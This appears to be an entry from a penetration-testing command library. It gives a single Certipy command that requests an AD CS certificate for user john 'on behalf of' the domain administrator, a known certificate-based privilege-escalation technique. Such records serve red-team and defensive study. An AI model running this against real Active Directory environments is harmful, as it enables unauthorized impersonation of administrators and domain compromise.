---
id: fe6797c2-e232-4d3f-a4c8-e119c9e696f8
name: Create certificate request for user john
type: command
executor: bash
data: $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template
  'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'
output: null
created_at: '2023-04-06T03:56:05.821088+00:00'
updated_at: '2023-04-10T20:26:24.887613+00:00'
---

# Create certificate request for user john

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'
```
